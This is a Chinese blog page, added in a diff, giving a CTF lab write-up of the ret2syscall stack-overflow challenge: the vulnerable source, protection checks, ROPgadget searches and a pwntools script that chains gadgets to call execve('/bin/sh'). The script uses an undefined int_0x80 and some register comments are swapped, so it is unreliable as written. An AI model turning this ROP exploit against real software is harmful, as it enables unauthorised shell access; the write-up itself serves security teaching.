@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hollk">
+
+
+    <meta name="subtitle" content="ret2text">
+
+
+    <meta name="description" content="说人话，讲清楚，负责到底">
+
+
+    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">
+
+
+<title>好好说话之ret2syscall | Hollk&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    <article class="post-wrap page">
+        
+        <h2 class="post-title">好好说话之ret2syscall</h2>
+        
+        <section class="post-content">
+            <p>题目路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ctf-challenges/</span>pwn<span class="regexp">/stackoverflow/</span>ret2syscall<span class="regexp">/bamboofox-ret2syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>看C代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What do you plan to do?\n"</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>checksec检查一下程序的保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec rop</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>检查发现是32位程序，开启了NX保护，使用IDA查看一下程序main函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依然还是通过gets函数进行函数输入，gets函数对输入长度没有限制，所以这是一个溢出点，同样的距离栈顶esp指针0x1c，距离栈底ebp指针0x64，可以算出输入字符起始位置距离ret返回地址0x6C+4个字节（ret2text有具体计算过程）</p>
+<p>由于开启了NX保护，也就是说不能把自己写的shellcode部署到内存当中。由于C代码中没有系统函数，也不可以调用程序本身的函数，不过可以利用程序本身自带的*shell = “/bin/sh”做文章。这个时候就需要利用程序中的gadget来获取shell。</p>
+<p>这个时候需要运用汇编中的int中断，中断是指CPU不再接着向下执行，而是转去处理这个特殊信息，这个特殊信息可以是CPU外部发过来的或内部产生的一种特殊信息，CPU在收到中断信息后，应该转去执行该中断信息的处理程序。发生中断时， CPU会收到中断信息，中断信息中包含有标识中断源的类型码，通过中断类型码可以在中断向量表中找到对应的中断处理程序的入口地址。对于8086pc机，中断向量表指定放在内存地址的0处。中断处理完成后，CPU会去执行前面发生中断指令的对应的下一跳指令，所以发生中断时要先保存当前程序的运行环境，再跳到中断处理程序。</p>
+<p>当执行 int 0x80后，系统就从用户态切换到内核态，并跳转到了 0x80 中断向量号 对应的中断向量服务程序 system_call，该服务程序的代码位置是：/linux-3.18.6/arch/x86/kernel/entry_ 32.S 文件中的 490 行处的 ENTRY(system_call)。只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<p>如果使用execve这个调用来进行获取shell，接下来就需要去找四个参数分别放在eax、ebx、ecx、edx中：</p>
+<ul>
+<li>execve系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>接下来需要寻找gadget来进行pop操作，将参数放到寄存器中，但是不一定一段连续的代码可以同时控制对应的寄存器，多以需要一段一段控制，所以在gadget中还需要使用ret来再次控制程序执行流程。所以可以使用ropgadgets工具进行查找gadget</p>
+<p>首先是寻找控制eax的gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hollk@ubuntu:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2syscall&#x2F;bamboofox-ret2syscall$ ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>可以选用第二个作为eax的gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>
+
+<p>接下来寻找ebx的gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">hollk@ubuntu:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2syscall&#x2F;bamboofox-ret2syscall$ ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>可以选用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>接下来需要获取/bin/sh字符串对应的地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall$ ROPgadget --binary rop  --string '/bin/sh' </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>最后需要找execve对应的系统调用号，在前面系统调用号文章中可以找到是0xb</p>
+<p>所有需要的都已经找到，payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_pop_ecx_pop_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat(<span class="string">'hollkdig'</span>*<span class="number">14</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_pop_ecx_pop_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload栈中部署：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">                     +---------------------------+</span><br><span class="line">                     |         <span class="type">int_0x80</span>          | <span class="type">int_0x80</span>指令部署(等待被执行)</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |          <span class="type">bin_sh</span>           | <span class="type">execve</span>第一个参数部署(等待pop到edx中)</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |            <span class="type">0</span>              | <span class="type">execve</span>第二个参数部署(等待pop到ecx中)</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |            <span class="type">0</span>              | <span class="type">execve</span>第三个参数部署(等待pop到ebx中)</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |<span class="type">pop_edx_pop_ecx_pop_ebx_ret</span>| <span class="type">执行pop</span> ebx、ecx、edx ret地址</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |           <span class="type">0xb</span>             | <span class="type">系统调用号部署（等待pop</span>到eax寄存器中） </span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |       <span class="type">pop_eax_ret</span>         | <span class="type">执行pop</span> eax ret地址，覆盖原ret返回位置</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |           <span class="type">kdig</span>            | <span class="type">'hollkdig</span>'覆盖原saved ebp位置</span><br><span class="line">              ebp---&gt;+---------------------------+</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">'hollkdig</span>'占位填满栈空间</span><br><span class="line">                     |           <span class="type">....            | 'hollkdig</span>'占位填满栈空间</span><br><span class="line">                     |           <span class="type">kdig</span>            | <span class="type">'hollkdig</span>'占位填满栈空间</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">'hollkdig</span>'占位填满栈空间</span><br><span class="line">                     |           <span class="type">kdig</span>            | <span class="type">'hollkdig</span>'占位填满栈空间</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">'hollkdig</span>'占位填满栈空间</span><br><span class="line">v4终止位置,ebp<span class="number">-0x64</span>--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>执行流程：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eip</span> ---&gt; pop_eax_ret gadget地址(由于pop_eax_ret覆盖了原<span class="keyword">ret</span>地址，所以<span class="built_in">eip</span>指向gadget并执行)</span><br><span class="line"><span class="built_in">esp</span> ---&gt; <span class="number">0xb</span>								(此时<span class="built_in">esp</span>指向部署到栈中的<span class="number">0xb</span>)</span><br><span class="line"><span class="built_in">eax</span> = <span class="number">0xb</span>										(<span class="keyword">pop</span> <span class="built_in">eax</span>后将<span class="number">0xb</span>压入<span class="built_in">eax</span>寄存器)</span><br><span class="line"><span class="built_in">eip</span> ---&gt; pop_edx_pop_ecx_pop_ebx_ret gadget地址  </span><br><span class="line">														(由于<span class="keyword">pop</span> <span class="built_in">eax</span>结束后进行<span class="keyword">ret</span>操作，所以<span class="built_in">eip</span>继续指向第二个gadget并执行)</span><br><span class="line"><span class="built_in">esp</span> ---&gt; <span class="number">0</span>									(此时<span class="built_in">esp</span>指向部署到栈中的execve第三个参数<span class="number">0</span>)</span><br><span class="line"><span class="built_in">ebx</span> = <span class="number">0</span>											(<span class="keyword">pop</span> <span class="built_in">ebx</span>后将<span class="number">0</span>压入<span class="built_in">ebx</span>寄存器)</span><br><span class="line"><span class="built_in">esp</span> ---&gt; <span class="number">0</span>									(此时<span class="built_in">esp</span>指向部署到栈中的execve第三个参数<span class="number">0</span>)</span><br><span class="line"><span class="built_in">ecx</span> = <span class="number">0</span>											(<span class="keyword">pop</span> <span class="built_in">ecx</span>后将<span class="number">0</span>压入<span class="built_in">ecx</span>寄存器)</span><br><span class="line"><span class="built_in">esp</span> ---&gt; bin_sh地址			 		 (此时<span class="built_in">esp</span>指向部署到栈中的execve第三个参数bin_sh地址)</span><br><span class="line"><span class="built_in">edx</span> = bin_sh地址					   (<span class="keyword">pop</span> <span class="built_in">edx</span>后将bin_sh地址压入<span class="built_in">eax</span>寄)</span><br><span class="line">执行int_0x80                 (由于执行完<span class="keyword">pop</span> <span class="built_in">ebx</span>、<span class="built_in">ecx</span>、<span class="built_in">edx</span>后进行<span class="keyword">ret</span>操作，所以<span class="built_in">eip</span>指向最后的<span class="keyword">int</span>)</span><br></pre></td></tr></table></figure>
+        </section>
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+	<br>
+	<span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+
+
+
+</footer>
+
+    </div>
+</body>
+</html>
